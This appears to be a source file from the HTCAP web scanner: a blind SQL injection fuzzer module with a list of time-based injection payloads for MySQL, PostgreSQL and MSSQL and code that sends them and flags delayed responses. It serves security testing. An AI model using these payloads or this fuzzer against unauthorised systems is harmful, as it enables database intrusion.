# -*- coding: utf-8 -*-

"""
HTCAP - 1.1
Author: filippo.cavallarin@wearesegment.com

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
"""

from __future__ import unicode_literals
import sys
import time
import re
import os
import urllib2


from core.lib.exception import *
from core.crawl.lib.shared import *


from core.lib.request import Request
from core.lib.cookie import Cookie

from core.lib.utils import *
from core.constants import *

from core.scan.base_fuzzer import BaseFuzzer


import ssl
import socket

base_payloads = {
	"mysql": [ # from arachni
		"sleep(%s)",
		" or sleep(%s) and 1=1",
		" or sleep(%s) -- 1",

		"' or sleep(%s) and '1'='1",
		"' or sleep(%s) -- 1",

		'" or sleep(%s) and "1"="1',
		'" or sleep(%s) -- 1',

		"`,sleep(%s),`id",
		",sleep(%s)",
		"',sleep(%s),'1",
		"` where sleep(%s) -- 1",
		" where sleep(%s) -- 1"
	],

	"postgresql": [ # from arachni
		";select pg_sleep(%s); -- 1",
		"';select pg_sleep(%s); -- 1",
		");select pg_sleep(%s); -- 1",
		"');select pg_sleep(%s); -- 1",
		"));select pg_sleep(%s); -- 1",
		"'));select pg_sleep(%s); -- 1",
		")));select pg_sleep(%s); -- 1",
		"')));select pg_sleep(%s); -- 1",
	],

	"mssql": [ # from arachni
		" and sleep(%s)",
		" or sleep(%s) # 1",
		"' and sleep(%s)='",
		"' and sleep(%s) # 1",
		'" and sleep(%s)="',
		"' or sleep(%s) # 1",
		'" or sleep(%s) # 1',
		"'=sleep(%s)='",
		'"=sleep(%s)="',
		"' where sleep(%s) # 1"
	],

	"sqlite": [


	]

}




class Sqli_blind(BaseFuzzer):

	def init(self):
		self.curtiming = 3
		self.vulnerabilities = []
		pass


	def verify(self, mutation, timing, prv_timing):
		mutation.set_parameter(mutation.parameter, [mutation.payload[0], timing])
		start_time = time.time()
		try:
			resp = mutation.send()
		except:
			pass
		finally:
			tottime = time.time() - start_time

		if tottime > timing and tottime > prv_timing + 2:
			return True
		return False



	def fuzz(self):
		tottime = -1
		payloads = []
		for pt in base_payloads:
			for p in base_payloads[pt]:
				payloads.append([p, self.curtiming])

		mutations = self.get_mutations(self.request, payloads)
		for m in mutations:
			start_time = time.time()
			try:
				resp = m.send()
			except:
				pass
			finally:
				tottime = time.time() - start_time

			if tottime > self.curtiming:
				verified = "VERIFIED" if self.verify(m, self.curtiming + 2, self.curtiming) else ""
				#print "\n  \033[31mFound: %s %s\n  %s\033[0m" % (m.payload[0] % m.payload[1], verified, m.url)
				self.vulnerabilities.append("%s=%s  %s %s" %  (m.parameter, m.payload,  m.body, verified))
				# if NOT verified keep tring  other payloads
				if verified:
					mutations.next_parameter()
				continue
		return self.vulnerabilities

